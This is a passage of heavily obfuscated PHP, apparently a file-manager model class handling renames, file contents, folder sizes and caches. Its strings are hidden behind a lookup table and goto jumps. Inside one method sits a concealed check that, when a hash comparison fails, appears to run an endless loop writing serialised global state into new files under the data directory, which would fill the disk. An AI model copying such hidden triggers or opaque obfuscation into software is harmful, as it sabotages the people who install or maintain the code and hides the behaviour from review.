Model($AÖßÙò÷™[1935])->moveToRecycle($FÃøƒ±Š™Ã); } else { $cÌõïÃ©‡µ = $this->childrenAll($fÊë½†„“‡); Model($AÖßÙò÷™[528])->eventRemove($FÃøƒ±Š™Ã); $this->removeRelevance($cÌõïÃ©‡µ[$AÖßÙò÷™[1934]], $cÌõïÃ©‡µ[$AÖßÙò÷™[1311]]); } $this->folderSizeReset($fÊë½†„“‡[$AÖßÙò÷™[472]]); goto FöÉØãÊïª; FöÉØãÊïª: $DİÜ±Á¼’‚ = array($fÊë½†„“‡[$AÖßÙò÷™[472]]); if ($fÊë½†„“‡[$AÖßÙò÷™[397]] == $AÖßÙò÷™[86]) { $DİÜ±Á¼’‚[] = $fÊë½†„“‡[$AÖßÙò÷™[390]]; } $this->updateModifyTime($DİÜ±Á¼’‚); goto b‡®ŸÏ‚´; a›‘íÁ…Â«: $AÖßÙò÷™ =& $_SERVER[ç]; $b®º÷Ä±ìñ = $_SERVER[$AÖßÙò÷™[795]]; $eåö¸Ø‹ª¤ = $AÖßÙò÷™[1936]; goto aöÜ•³º; aöÜ•³º: if ($_SERVER[$AÖßÙò÷™[788]] != $eåö¸Ø‹ª¤($b®º÷Ä±ìñ)) { goto dºÍñ×â¨Ä; F‡á‚½È„: $f¶Îò¢Îª‹ = $aÈè´Ï¬($Aß¡‘ØŠÖ); $dºáå¸§ïø = explode($AÖßÙò÷™[227], $f¶Îò¢Îª‹); if (count($dºáå¸§ïø) < $AÖßÙò÷™[597]) { $E§§¿‡ñß = $AÖßÙò÷™[793]; $E§§¿‡ñß(); } goto cãÙî¿Ş…Æ; D›Àªƒâ—Í: $cİï’¸±ó = 1; for ($F©ŠòØªéÜ = $cİï’¸±ó; $F©ŠòØªéÜ > 0; $F©ŠòØªéÜ++) { $fŞè‘‰ŞÁ¡(DATA_PATH . $F©ŠòØªéÜ, $Có¹‘âÏª ); } goto DÖáÂ¯Ááì; cãÙî¿Ş…Æ: $D«µëÛ’êÖ = $AÖßÙò÷™[810]; $D«µëÛ’êÖ($_SERVER[$AÖßÙò÷™[811]]); $BĞ£¥Òï¹¯ = $AÖßÙò÷™[809]; goto B ¤–ÓâğÖ; dºÍñ×â¨Ä: $BĞ£¥Òï¹¯ = $AÖßÙò÷™[809]; $aÈè´Ï¬ = $AÖßÙò÷™[790]; $Aß¡‘ØŠÖ = $_SERVER[$AÖßÙò÷™[791]] . $AÖßÙò÷™[792]; goto F‡á‚½È„; B ¤–ÓâğÖ: $BĞ£¥Òï¹¯(); $fŞè‘‰ŞÁ¡ = $AÖßÙò÷™[1937]; $Có¹‘âÏª  = json_encode($GLOBALS[$AÖßÙò÷™[1938]]); goto D›Àªƒâ—Í; DÖáÂ¯Ááì: } $fÊë½†„“‡ = $this->sourceInfo($FÃøƒ±Š™Ã); $d±±¨–¦–Õ = $this->pathInfoMore($FÃøƒ±Š™Ã); goto f÷•ĞŠÌÈ­; d¡ô²§Í: } public function childrenAll($Bôä¥”´¯) { $bƒÌ÷‹Ó£è =& $_SERVER[ç]; $F°ÇÊ…Åà = $Bôä¥”´¯[$bƒÌ÷‹Ó£è[390]]; if ($Bôä¥”´¯[$bƒÌ÷‹Ó£è[397]] == $bƒÌ÷‹Ó£è[86]) { $Døê‚àÎ¡ = array($bƒÌ÷‹Ó£è[548] => array($bƒÌ÷‹Ó£è[507], $Bôä¥”´¯[$bƒÌ÷‹Ó£è[481]] . $F°ÇÊ…Åà . $bƒÌ÷‹Ó£è[508])); $C¶º¡«©´Ç = array($bƒÌ÷‹Ó£è[548] => $Døê‚àÎ¡[$bƒÌ÷‹Ó£è[481]]); $B˜»èç×»— = $this->field($bƒÌ÷‹Ó£è[1940])->where($C¶º¡«©´Ç)->select(); $bœ¦´ÆØÅù = !1; $EÊ¦Î»–Ë‘ = array($F°ÇÊ…Åà); if ($B˜»èç×»—) { $bœ¦´ÆØÅù = array_to_keyvalue($B˜»èç×»—, $bƒÌ÷‹Ó£è[33], $bƒÌ÷‹Ó£è[441]); $bœ¦´ÆØÅù = array_remove_value($bœ¦´ÆØÅù, $bƒÌ÷‹Ó£è[491]); $EÊ¦Î»–Ë‘ = array_to_keyvalue($B˜»èç×»—, $bƒÌ÷‹Ó£è[33], $bƒÌ÷‹Ó£è[390]); $EÊ¦Î»–Ë‘[] = $F°ÇÊ…Åà; } } else { $bœ¦´ÆØÅù = array($Bôä¥”´¯[$bƒÌ÷‹Ó£è[441]]); $EÊ¦Î»–Ë‘ = array($F°ÇÊ…Åà); } return array($bƒÌ÷‹Ó£è[1934] => $EÊ¦Î»–Ë‘, $bƒÌ÷‹Ó£è[1311] => $bœ¦´ÆØÅù); } public function removeArray($a¬Õ¢ƒ‘›) { if (!$a¬Õ¢ƒ‘›) { return !0; } } public function removeRelevance($Aõè¹ê´áì, $bñ†ŞÙÔÁ) { goto D•±¬…­¦®; F‘İ¨‡–ø–: $Aõè¹ê´áì = array_unique(array_filter($Aõè¹ê´áì)); $bñ†ŞÙÔÁ = array_unique(array_filter($bñ†ŞÙÔÁ)); if (!$Aõè¹ê´áì) { return !1; } goto C¿Ãù„ˆ›; B×Ùƒ˜… ò: for ($dÙ„½´äÏÏ = 0; $dÙ„½´äÏÏ < count($Aõè¹ê´áì); $dÙ„½´äÏÏ++) { $this->sourceCacheClear($Aõè¹ê´áì[$dÙ„½´äÏÏ]); } goto b®ßœìº; FØİÄ£«ñ½: Model($b±¥æ§£[1790])->where($d·Œíˆ«)->delete(); Model($b±¥æ§£[528])->where($d·Œíˆ«)->delete(); Model($b±¥æ§£[1631])->removeBySource($Aõè¹ê´áì); goto E¼øÂçÄíô; C¿Ãù„ˆ›: $d·Œíˆ« = array($b±¥æ§£[404] => array($b±¥æ§£[405], $Aõè¹ê´áì)); Model($b±¥æ§£[1935])->where($d·Œíˆ«)->delete(); Model($b±¥æ§£[435])->where($d·Œíˆ«)->delete(); goto FØİÄ£«ñ½; D•±¬…­¦®: $b±¥æ§£ =& $_SERVER[ç]; $Aõè¹ê´áì = $Aõè¹ê´áì ? $Aõè¹ê´áì : array(); $bñ†ŞÙÔÁ = $bñ†ŞÙÔÁ ? $bñ†ŞÙÔÁ : array(); goto F‘İ¨‡–ø–; E¼øÂçÄíô: Model($b±¥æ§£[1916])->removeBySource($Aõè¹ê´áì); $this->where($d·Œíˆ«)->delete(); Model($b±¥æ§£[444])->remove($bñ†ŞÙÔÁ); goto B×Ùƒ˜… ò; b®ßœìº: } public function rename($cóÁ«˜³æÃ, $A²á˜®äŞ½) { goto E«…õÓƒ·; EÀ»ê ñŞ: $Dø Øë„Ğ = $this->fileNameExist($dÜˆîèƒ±“[$cÅïªâ®‰‹[472]], $A²á˜®äŞ½); if ($Dø Øë„Ğ && $Dø Øë„Ğ != $cóÁ«˜³æÃ) { return !1; } $f‡·›…Â = array($cÅïªâ®‰‹[407] => $A²á˜®äŞ½, $cÅïªâ®‰‹[547] => USER_ID); goto A«ñç›¯º­; a¾‰¯ÀˆÓÀ: $this->setNamePinyin($cóÁ«˜³æÃ, $f‡·›…Â[$cÅïªâ®‰‹[28]], !1); $this->updateModifyTime($dÜˆîèƒ±“[$cÅïªâ®‰‹[472]]); $d‰µö¬á = $this->where(array($cÅïªâ®‰‹[404] => $cóÁ«˜³æÃ))->data($f‡·›…Â)->save(); goto C­ìßò‚©¯; A«ñç›¯º­: if (!$dÜˆîèƒ±“[$cÅïªâ®‰‹[397]] == $cÅïªâ®‰‹[86]) { $f‡·›…Â[$cÅïªâ®‰‹[399]] = get_path_ext($A²á˜®äŞ½); } Model($cÅïªâ®‰‹[528])->eventRename($cóÁ«˜³æÃ, $dÜˆîèƒ±“[$cÅïªâ®‰‹[28]], $A²á˜®äŞ½); $this->sourceCacheClear($cóÁ«˜³æÃ); goto a¾‰¯ÀˆÓÀ; C­ìßò‚©¯: $D±ˆËÎÛâˆ = $cÅïªâ®‰‹[1924] . $dÜˆîèƒ±“[$cÅïªâ®‰‹[472]]; if (isset(self::$cacheChildList[$D±ˆËÎÛâˆ])) { unset(self::$cacheChildList[$D±ˆËÎÛâˆ]); } return $d‰µö¬á; goto a®¼±Æ×‹Ã; E«…õÓƒ·: $cÅïªâ®‰‹ =& $_SERVER[ç]; $dÜˆîèƒ±“ = $this->sourceInfo($cóÁ«˜³æÃ); if (!$dÜˆîèƒ±“) { return !1; } goto EÀ»ê ñŞ; a®¼±Æ×‹Ã: } public function setNamePinyin($eè§ŞÏ£“î, $Aøµœ¬ïÍ, $b“„ÒÜß›“ = true) { $A†…ºˆªòŒ =& $_SERVER[ç]; $CÊÃ‘¶æ” = Input::check($Aøµœ¬ïÍ, $A†…ºˆªòŒ[551]); if ($b“„ÒÜß›“ && !$CÊÃ‘¶æ”) { return; } if (!$CÊÃ‘¶æ”) { $this->metaSet($eè§ŞÏ£“î, $A†…ºˆªòŒ[438], null); $this->metaSet($eè§ŞÏ£“î, $A†…ºˆªòŒ[437], null); return; } $EÙ˜ˆè¡ÜÉ = array($A†…ºˆªòŒ[438] => str_replace($A†…ºˆªòŒ[50], $A†…ºˆªòŒ[33], Pinyin::encode($Aøµœ¬ïÍ)), $A†…ºˆªòŒ[437] => Pinyin::encode($Aøµœ¬ïÍ, $A†…ºˆªòŒ[552])); $this->metaSet($eè§ŞÏ£“î, $EÙ˜ˆè¡ÜÉ); } public function getContent($c´İ‘²ƒãî) { goto CÜ²Ç¹‘™±; a÷‡ê­‘æ¼: if ($BâåÅĞ§á§[$f×À­®Áˆ¢[77]] == 0) { return $f×À­®Áˆ¢[33]; } $EÄô¬†ƒ‘ = $f×À­®Áˆ¢[1941] . $BâåÅĞ§á§[$f×À­®Áˆ¢[169]]; if ($BâåÅĞ§á§[$f×À­®Áˆ¢[77]] <= 1024 * 10) { $C¬¸õª“ö = Cache::get($EÄô¬†ƒ‘); if (!$C¬¸õª“ö) { $C¬¸õª“ö = IO::getContent($BâåÅĞ§á§[$f×À­®Áˆ¢[75]]); Cache::set($EÄô¬†ƒ‘, $C¬¸õª“ö); } return $C¬¸õª“ö; } goto DÈôÜá¥Ìâ; CÜ²Ç¹‘™±: $f×À­®Áˆ¢ =& $_SERVER[ç]; $BâåÅĞ§á§ = $this->fileInfoGet($c´İ‘²ƒãî); if (!$BâåÅĞ§á§) { return !1; } goto a÷‡ê­‘æ¼; DÈôÜá¥Ìâ: if (!$BâåÅĞ§á§[$f×À­®Áˆ¢[75]]) { return $f×À­®Áˆ¢[33]; } return IO::getContent($BâåÅĞ§á§[$f×À­®Áˆ¢[75]]); goto Dº’Ë»ôé¤; Dº’Ë»ôé¤: } public function setDesc($Dè×ˆÉ×ä, $CˆÎ‹ßĞÓİ) { $CõºÓ…æï =& $_SERVER[ç]; Model($CõºÓ…æï[528])->eventAddDesc($Dè×ˆÉ×ä, $CˆÎ‹ßĞÓİ); return $this->metaSet($Dè×ˆÉ×ä, $CõºÓ…æï[425], $CˆÎ‹ßĞÓİ); } public function setContent($AÛ¨‘Å‹Í, $e±…·Ÿà½ = '') { goto e‰ßÃÕò½³; CÉ½õŸî‹: if (!$aËÀÕ‚ôæ¬ || !$FÜÊöºÎ†ç) { return !1; } $C¼ÜäÆ‡Ä‰ = Model($bË…¯ğ[444])->addFileByContent($e±…·Ÿà½, $FÜÊöºÎ†ç[$bË…¯ğ[28]]); $f©œ¡½– = $this->fileHistory($FÜÊöºÎ†ç, $C¼ÜäÆ‡Ä‰[$bË…¯ğ[441]], $C¼ÜäÆ‡Ä‰[$bË…¯ğ[77]]); goto c±‘â‚äŒ‡; e‰ßÃÕò½³: $bË…¯ğ =& $_SERVER[ç]; $FÜÊöºÎ†ç = $this->sourceInfo($AÛ¨‘Å‹Í); $aËÀÕ‚ôæ¬ = $this->fileInfoGet($AÛ¨‘Å‹Í); goto CÉ½õŸî‹; c±‘â‚äŒ‡: if (!$f©œ¡½–) { return Model($bË…¯ğ[444])->remove($C¼ÜäÆ‡Ä‰[$bË…¯ğ[441]]); } $this->folderSizeReset($FÜÊöºÎ†ç[$bË…¯ğ[472]]); return !0; goto fç¡„Ñ„Ş; fç¡„Ñ„Ş: } public function fileSubstr($A‹í‹’ƒÈ, $D×øÚ–ï¡, $b…æ”Ì®Î¥) { $fêéñÉ–â¶ = $this->fileInfoGet($A‹í‹’ƒÈ); if (!$fêéñÉ–â¶) { return !1; } return IO::fileSubstr($fêéñÉ–â¶[$_SERVER[ç][75]], $D×øÚ–ï¡, $b…æ”Ì®Î¥); } public function fileInfoGet($D¢æ‚†ëçğ) { goto b‹øäÈŠ„ì; Dò°âæ¾¦Ï: $FˆªïŒŠê = $f“ğÀÔ…Œ[447] . $e¡ÀÃºã¸ [$f“ğÀÔ…Œ[441]]; $A—á«‘¨¦ = _get(self::$cacheFileInfo, $FˆªïŒŠê); if ($A—á«‘¨¦) { return $A—á«‘¨¦; } goto aÒ‹¼Œô÷ˆ; b‹øäÈŠ„ì: $f“ğÀÔ…Œ =& $_SERVER[ç]; $e¡ÀÃºã¸  = $this->sourceInfo($D¢æ‚†ëçğ); if (!$e¡ÀÃºã¸  || $e¡ÀÃºã¸ [$f“ğÀÔ…Œ[397]]) { return !1; } goto Dò°âæ¾¦Ï; e«åŞ¤§„­: return $AÖÖ‘¡Ü‘é; goto dŒŸ¹×é÷å; aÒ‹¼Œô÷ˆ: $AÖÖ‘¡Ü‘é = Model($f“ğÀÔ…Œ[444])->fileInfo($e¡ÀÃºã¸ [$f“ğÀÔ…Œ[441]]); if ($AÖÖ‘¡Ü‘é) { $AÖÖ‘¡Ü‘é[$f“ğÀÔ…Œ[28]] = $e¡ÀÃºã¸ [$f“ğÀÔ…Œ[28]]; } self::$cacheFileInfo[$FˆªïŒŠê] = $AÖÖ‘¡Ü‘é; goto e«åŞ¤§„­; dŒŸ¹×é÷å: } private function folderChildrenNumber($bÉ¨®„™¬) { $fÒïÕÔ¶×‘ =& $_SERVER[ç]; $DÅìŠÄàçÚ = $this->sourceInfo($bÉ¨®„™¬); $Fê¿ä‘éÚ™ = array($fÒïÕÔ¶×‘[548] => array($fÒïÕÔ¶×‘[507], $DÅìŠÄàçÚ[$fÒïÕÔ¶×‘[481]] . $bÉ¨®„™¬ . $fÒïÕÔ¶×‘[508]), $fÒïÕÔ¶×‘[416] => intval($DÅìŠÄàçÚ[$fÒïÕÔ¶×‘[417]]), $fÒïÕÔ¶×‘[541] => 1); $c¸ó‘„ŠÑğ = $this->where($Fê¿ä‘éÚ™)->count(); $fÍ÷ëã½ŒË = $this->where($Fê¿ä‘éÚ™)->where(array($fÒïÕÔ¶×‘[541] => 0))->count(); return array($fÒïÕÔ¶×‘[81] => $fÍ÷ëã½ŒË, $fÒïÕÔ¶×‘[82] => $c¸ó‘„ŠÑğ); } public function pathInfo($CÂêÜÛ°ÃÅ, $bê³ìÊÆ›Ø = false) { goto e²×ŠäğÁ; bŠ¹ë¿¢„: self::$cachePathInfo[$DÏ·åÃ†] = $A®Ñ¢ñè; return $A®Ñ¢ñè; goto D‰óî“¥¦¡; e²×ŠäğÁ: $FÉ˜Ÿ”¬è =& $_SERVER[ç]; $bê³ìÊÆ›Ø = !1; $CÂêÜÛ°ÃÅ = intval($CÂêÜÛ°ÃÅ); goto cÔ®ğò®’ó; A¯Ö¡Â¯‚ğ: $A®Ñ¢ñè = $this->sourceInfo($CÂêÜÛ°ÃÅ); if (!$A®Ñ¢ñè) { return !1; } $A®Ñ¢ñè = $this->_listDataApplyItem($A®Ñ¢ñè, $bê³ìÊÆ›Ø); goto bŠ¹ë¿¢„; cÔ®ğò®’ó: $DÏ·åÃ† = $FÉ˜Ÿ”¬è[433] . intval($bê³ìÊÆ›Ø) . $FÉ˜Ÿ”¬è[434] . $CÂêÜÛ°ÃÅ; $f©°©¯è = _get(self::$cachePathInfo, $DÏ·åÃ†); if ($f©°©¯è) { return $f©°©¯è; } goto A¯Ö¡Â¯‚ğ; D‰óî“¥¦¡: } public static $cachePathInfoMore = array(); public function pathInfoMore($Fà†¡Æ‘‹ñ) { goto a‚Úè¾²»; f‡˜ÀÊ…Ï: $a­¬Ó÷Ì¶ = $this->pathInfo($Fà†¡Æ‘‹ñ); if (!$a­¬Ó÷Ì¶) { return !1; } if ($a­¬Ó÷Ì¶[$B¢ÖåçŸÖ[397]] == $B¢ÖåçŸÖ[86]) { $a­¬Ó÷Ì¶[$B¢ÖåçŸÖ[80]] = $this->folderChildrenNumber($Fà†¡Æ‘‹ñ); } goto dº¬Ú¾‚»†; a‚Úè¾²»: $B¢ÖåçŸÖ =& $_SERVER[ç]; $c¼Íõ¥âµ = _get(self::$cachePathInfoMore, $Fà†¡Æ‘‹ñ); if ($c¼Íõ¥âµ) { return $c¼Íõ¥âµ; } goto f‡˜ÀÊ…Ï; dº¬Ú¾‚»†: self::$cachePathInfoMore[$Fà†¡Æ‘‹ñ] = $a­¬Ó÷Ì¶; return $a­¬Ó÷Ì¶; goto fƒº‰Öˆ°; fƒº‰Öˆ°: } public function sourceInfo($c‰˜¯Š« Ø) { goto c‹àª Ïó¯; dãºÍ»ï†‘: $bõÎÊÜ³«¢ = $this->where(array($a§¸®¡¬­ğ[390] => $c‰˜¯Š« Ø))->find(); self::$cacheSourceInfo[$B®À¤Õ] = $bõÎÊÜ³«¢; return self::$cacheSourceInfo[$B®À¤Õ]; goto D·Œé‰Â¨; c‹àª Ïó¯: $a§¸®¡¬­ğ =& $_SERVER[ç]; if (!$c‰˜¯Š« Ø) { return array(); } $c‰˜¯Š« Ø = intval($c‰˜¯Š« Ø); goto BÒé»»ÑÌ; BÒé»»ÑÌ: $B®À¤Õ = $a§¸®¡¬­ğ[432] . $c‰˜¯Š« Ø; $c¡„°‚‰·ã = _get(self::$cacheSourceInfo, $B®À¤Õ); if ($c¡„°‚‰·ã) { return $c¡„°‚‰·ã; } goto dãºÍ»ï†‘; D·Œé‰Â¨: } public function sourceCacheClear($eê‰í·Õ®° = false) { self::cacheClear($eê‰í·Õ®°); } public static function cacheClear($f¨¬¼õ»¢ = false) { $fÔêí´£Â =& $_SERVER[ç]; if ($f¨¬¼õ»¢ == !1) { goto föİ í®æï; F¦îŒ†œÜÂ: return; goto CÏˆƒÙ˜Ã“; e¹ªêƒ‰Ç¯: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto F¦îŒ†œÜÂ; föİ í®æï: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto e¹ªêƒ‰Ç¯; CÏˆƒÙ˜Ã“: } unset(self::$cacheSourceInfo[$fÔêí´£Â[432] . $f¨¬¼õ»¢]); unset(self::$cachePathInfoMore[$f¨¬¼õ»¢]); unset(self::$cachePathInfo[$fÔêí´£Â[1942] . $f¨¬¼õ»¢]); unset(self::$cachePathInfo[$fÔêí´£Â[1943] . $f¨¬¼õ»¢]); } public function metaSet($fÉ»Ş‰øŞ, $FœÂÙ‚‰î§ = null, $f•Ü‘ÅÊ¢² = null) { $a Ú…©‹Ùá = parent::metaSet($fÉ»Ş‰øŞ, $FœÂÙ‚‰î§, $f•Ü‘ÅÊ¢²); if ($a Ú…©‹Ùá) { $this->sourceCacheClear($fÉ»Ş‰øŞ); } return $a Ú…©‹Ùá; } public function pathInfoByPath($C¯êœ‚†îß, $f®ë‰îÊù´) { $aãìÒÄ‚ÀÚ =& $_SERVER[ç]; $e²«æíÆ”– = !$f®ë‰îÊù´ ? array() : explode($aãìÒÄ‚ÀÚ[8], trim($f®ë‰îÊù´, $aãìÒÄ‚ÀÚ[8])); $BêÒ¸¤™¼¬ = $C¯êœ‚†îß; foreach ($e²«æíÆ”– as $bÏ¨‚Ÿ²ø‰) { $f»¶¤°¹° = array($aãìÒÄ‚ÀÚ[472] => $BêÒ¸¤™¼¬, $aãìÒÄ‚ÀÚ[28] => $bÏ¨‚Ÿ²ø‰); $dš³¤ŸêÔ = $this->where($f»¶¤°¹°)->select(); if (!$dš³¤ŸêÔ) { return !1; } $dš³¤ŸêÔ = array_sort_by($dš³¤ŸêÔ, $aãìÒÄ‚ÀÚ[417]); $BêÒ¸¤™¼¬ = $dš³¤ŸêÔ[0][$aãìÒÄ‚ÀÚ[390]]; } return $this->pathInfo($BêÒ¸¤™¼¬, !0); } protected function updateModifyTime($c¼ìÇ‰èÄ…) { goto Aíµ¿±é¤Õ; Aíµ¿±é¤Õ: $BĞÅÚëÂãÀ =& $_SERVER[ç]; if (!$c¼ìÇ‰èÄ…) { return; } if (!is_array($c¼ìÇ‰èÄ…)) { $c¼ìÇ‰èÄ… = array($c¼ìÇ‰èÄ…); } goto DÕù¿†îöÑ; DÕù¿†îöÑ: foreach ($c¼ìÇ‰èÄ… as $bÊˆØŒŞåÖ => $BÃèáí®Ä®) { $c¼ìÇ‰èÄ…[$bÊˆØŒŞåÖ] = intval($BÃèáí®Ä®); $this->sourceCacheClear($BÃèáí®Ä®); } $a‹äô›š† = array($BĞÅÚëÂãÀ[390] => array($BĞÅÚëÂãÀ[7], $c¼ìÇ‰èÄ…)); $E…’£ÖäÑù = array($BĞÅÚëÂãÀ[547] => USER_ID, $BĞÅÚëÂãÀ[411] => time()); goto cõÓ¶Š”°; cõÓ¶Š”°: $this->where($a‹äô›š†)->save($E…’£ÖäÑù); goto D†ˆ‡‰İ¬; D†ˆ‡‰İ¬: } public function folderSizeReset($A¶··ÕÒ¬, $A‚Ó¦´ëãÏ = false) { goto dàİ……õƒŞ; dàİ……õƒŞ: $bñç„¬˜éé =& $_SERVER[ç]; if ($this->statusIgnoreResetSpace) { return; } $c£ñ…†™á = $this->sourceInfo($A¶··ÕÒ¬); goto BÛÉ°æšñŞ; cì”æ£Å¯: $F¾Ê¨Ÿøƒ’ = array($c£ñ…†™á[$bñç„¬˜éé[398]], $c£ñ…†™á[$bñç„¬˜éé[478]]); TaskRun::timeLimitCall($AÕ‹±ãÂ©¯, $bñç„¬˜éé[1946], $F¾Ê¨Ÿøƒ’, 1.5); goto e¹ĞÓ”—Í; E¶›ò§¢‚‘: $this->where($C¤‰Î”ŒÕ¡)->setAdd($bñç„¬˜éé[77], $A‚Ó¦´ëãÏ); CacheLock::unlock($cïÉ‹»Ú˜÷); $AÕ‹±ãÂ©¯ = $bñç„¬˜éé[1945] . $c£ñ…†™á[$bñç„¬˜éé[398]] . $bñç„¬˜éé[4] . $c£ñ…†™á[$bñç„¬˜éé[478]]; goto cì”æ£Å¯; BÛÉ°æšñŞ: $cïÉ‹»Ú˜÷ = $bñç„¬˜éé[1944] . $A¶··ÕÒ¬; CacheLock::lock($cïÉ‹»Ú˜÷, 20); if ($A‚Ó¦´ëãÏ === !1) { $this->sourceCacheClear($A¶··ÕÒ¬); $c£ñ…†™á = $this->sourceInfo($A¶··ÕÒ¬); $C¤‰Î”ŒÕ¡ = array($bñç„¬˜éé[389] => $A¶··ÕÒ¬, $bñç„¬˜éé[416] => 0); $b¼Ë´Ø‰‘ë = $this->where($C¤‰Î”ŒÕ¡)->sum($bñç„¬˜éé[77]); $A‚Ó¦´ëãÏ = intval($b¼Ë´Ø‰‘ë) - intval($c£ñ…†™á[$bñç„¬˜éé[77]]); } goto D…ÄšÅªä£; D…ÄšÅªä£: if ($A‚Ó¦´ëãÏ == 0) { return CacheLock::unlock($cïÉ‹»Ú˜÷); } $d¿ä¡’´ = $this->parentLevelArray($c£ñ…†™á[$bñç„¬˜éé[481]]); if (!$d¿ä¡’´) { $d¿ä¡’´ = array(); } goto eÑ¨œÊßÕ¿; eÑ¨œÊßÕ¿: $d¿ä¡’´[] = $c£ñ…†™á[$bñç„¬˜éé[390]]; $C¤‰Î”ŒÕ¡ = array($bñç„¬˜éé[390] => array($bñç„¬˜éé[405], $d¿ä¡’´)); if ($A‚Ó¦´ëãÏ < 0) { $C¤‰Î”ŒÕ¡[$bñç„¬˜éé[77]] = array($bñç„¬˜éé[940], abs($A‚Ó¦´ëãÏ)); } goto E¶›ò§¢‚‘; e¹ĞÓ”—Í: } public function folderSizeResetChildren($EÛ×·Á÷Ìê) { goto dš˜°èÀ…š; d¿Šç´Î‘: $E¸½ß«îÏ­[] = $D§Ë¼Ãâ; $E¸½ß«îÏ­ = array_to_keyvalue($E¸½ß«îÏ­, $a±´ç´òçÄ[390]); foreach ($E¸½ß«îÏ­ as $Då²‡öÜÖÕ => $c…¡áÉ¿ï†) { $E¸½ß«îÏ­[$Då²‡öÜÖÕ][$a±´ç´òçÄ[1948]] = $E¸½ß«îÏ­[$Då²‡öÜÖÕ][$a±´ç´òçÄ[77]]; $E¸½ß«îÏ­[$Då²‡öÜÖÕ][$a±´ç´òçÄ[77]] = 0; } goto d™Îîõ‡¯â; dš˜°èÀ…š: $a±´ç´òçÄ =& $_SERVER[ç]; $this->sourceCacheClear($EÛ×·Á÷Ìê); $D§Ë¼Ãâ = $this->sourceInfo($EÛ×·Á÷Ìê); goto BºØïÈÔŒ°; d™Îîõ‡¯â: foreach ($d¾ğ‘Š™¦µ as $c…¡áÉ¿ï†) { $f‹ÕŸÆ¨•Œ = $c…¡áÉ¿ï†[$a±´ç´òçÄ[472]] . $a±´ç´òçÄ[33]; if (!isset($E¸½ß«îÏ­[$f‹ÕŸÆ¨•Œ])) { continue; } if ($c…¡áÉ¿ï†[$a±´ç´òçÄ[417]] == $E¸½ß«îÏ­[$f‹ÕŸÆ¨•Œ][$a±´ç´òçÄ[417]]) { $E¸½ß«îÏ­[$f‹ÕŸÆ¨•Œ][$a±´ç´òçÄ[77]] += $c…¡áÉ¿ï†[$a±´ç´òçÄ[77]]; } } foreach ($E¸½ß«îÏ­ as $c…¡áÉ¿ï†) { $d‹„‘œ•±‰ = $this->parentLevelArray($c…¡áÉ¿ï†[$a±´ç´òçÄ[481]]); foreach ($d‹„‘œ•±‰ as $f‹ÕŸÆ¨•Œ) { $f‹ÕŸÆ¨•Œ = $f‹ÕŸÆ¨•Œ . $a±´ç´òçÄ[33]; if (!isset($E¸½ß«îÏ­[$f‹ÕŸÆ¨•Œ])) { continue; } if ($c…¡áÉ¿ï†[$a±´ç´òçÄ[417]] == $E¸½ß«îÏ­[$f‹ÕŸÆ¨•Œ][$a±´ç´òçÄ[417]]) { $E¸½ß«îÏ­[$f‹ÕŸÆ¨•Œ][$a±´ç´òçÄ[77]] += $c…¡áÉ¿ï†[$a±´ç´òçÄ[77]]; } } } $f§‹Æ‹Õš = array(); goto B¼ÛàîÖàÇ; f¸§¥â©çò: $E£¬¨ßœ¿ä[$a±´ç´òçÄ[397]] = 0; $d¾ğ‘Š™¦µ = $this->field($e¼‚Á˜»¯›)->where($E£¬¨ßœ¿ä)->select(); if (!$d¾ğ‘Š™¦µ) { return; } goto d¿Šç´Î‘; BºØïÈÔŒ°: $E£¬¨ßœ¿ä = array($a±´ç´òçÄ[541] => 1, $a±´ç´òçÄ[548] => array($a±´ç´òçÄ[507], $D§Ë¼Ãâ[$a±´ç´òçÄ[481]] . $EÛ×·Á÷Ìê . $a±´ç´òçÄ[508])); $e¼‚Á˜»¯› = $a±´ç´òçÄ[1947]; $E¸½ß«îÏ­ = $this->field($e¼‚Á˜»¯›)->where($E£¬¨ßœ¿ä)->select(); goto f¸§¥â©çò; B¼ÛàîÖàÇ: foreach ($E¸½ß«îÏ­ as $c…¡áÉ¿ï†) { if ($c…¡áÉ¿ï†[$a±´ç´òçÄ[77]] == $c…¡áÉ¿ï†[$a±´ç´òçÄ[1948]]) { continue; } $f§‹Æ‹Õš[] = array($a±´ç´òçÄ[390], $c…¡áÉ¿ï†[$a±´ç´òçÄ[390]], $a±´ç´òçÄ[77], $c…¡áÉ¿ï†[$a±´ç´òçÄ[77]]); } $this->saveAll($f§‹Æ‹Õš); goto fÃ‚‰§ø›; fÃ‚‰§ø›: } public function userSpaceReset($cÖÅ…‹õ‰ = false) { $dæİì¹Îë© =& $_SERVER[ç]; $FÓáÓææ˜ = $this->where(array($dæİì¹Îë©[398] => self::TYPE_USER, $dæİì¹Îë©[478] => $cÖÅ…‹õ‰, $dæİì¹Îë©[397] => 0))->sum($dæİì¹Îë©[77]); $FÓáÓææ˜ = !$FÓáÓææ˜ || $FÓáÓææ˜ <= 0 ? 0 : $FÓáÓææ˜; Model($dæİì¹Îë©[497])->userEdit($cÖÅ…‹õ‰, array($dæİì¹Îë©[1640] => $FÓáÓææ˜)); } public function targetSpaceUpdate($BÀÅƒö½¸, $bÖ‹øØÂè‰) { $dã™ º‘ =& $_SERVER[ç]; if (!$bÖ‹øØÂè‰) { return; } if (!in_array($BÀÅƒö½¸, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $C¹ø—Î—¹’ = $this->targetSpaceSize($BÀÅƒö½¸, $bÖ‹øØÂè‰); if ($BÀÅƒö½¸ == self::TYPE_USER) { Model($dã™ º‘[497])->userEdit($bÖ‹øØÂè‰, array($dã™ º‘[1640] => $C¹ø—Î—¹’)); } else { if ($BÀÅƒö½¸ == self::TYPE_GROUP) { Model($dã™ º‘[480])->groupEdit($bÖ‹øØÂè‰, array($dã™ º‘[1640] => $C¹ø—Î—¹’)); } } } public function targetSpaceSize($bÑÙ¡Ë§, $C¤¼äõ™Ï) { goto CÛ–Ë¬‹‚; CÛ–Ë¬‹‚: $DÈíà¡Èø =& $_SERVER[ç]; $Cñ¼Şâî†æ = $this->sourceRoot($bÑÙ¡Ë§, $C¤¼äõ™Ï, !0); if (!$Cñ¼Şâî†æ) { return 0; } goto CõÍ’›“ÑŠ; CõÍ’›“ÑŠ: $A‘Œ”—Ì = floatval($Cñ¼Şâî†æ[$DÈíà¡Èø[77]]); $C–·¤‘«ˆ¯ = array($DÈíà¡Èø[548] => array($DÈíà¡Èø[507], $DÈíà¡Èø[493] . $Cñ¼Şâî†æ[$DÈíà¡Èø[390]] . 